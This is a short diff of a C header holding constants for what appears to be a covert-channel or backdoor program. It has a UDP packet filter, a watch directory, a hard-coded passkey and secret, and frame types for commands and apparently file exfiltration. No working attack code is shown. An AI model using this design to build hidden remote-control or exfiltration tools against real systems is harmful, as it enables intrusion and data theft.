@@ -41,11 +41,14 @@ NOTES: This file holds the constants used throughout the program.
 #define DEF_FLT "udp port 9001"
 #define DEF_WCH "/home/k/test/"
 
+#define SIGNTR  0x20
 #define HDR_KEY "(P^.^)=P"
-#define PASSKEY "tessera"
+#define PASSKEY "tesserac"
 #define SEKRET  "Don't panic"
 
-#define CMD_STR "start["
-#define CMD_END "]end"
+#define FRAM_SZ 8
+#define MD5_LEN 4
+#define CMD_TYP 0x00
+#define XFL_TYP 0x01
 
 #endif
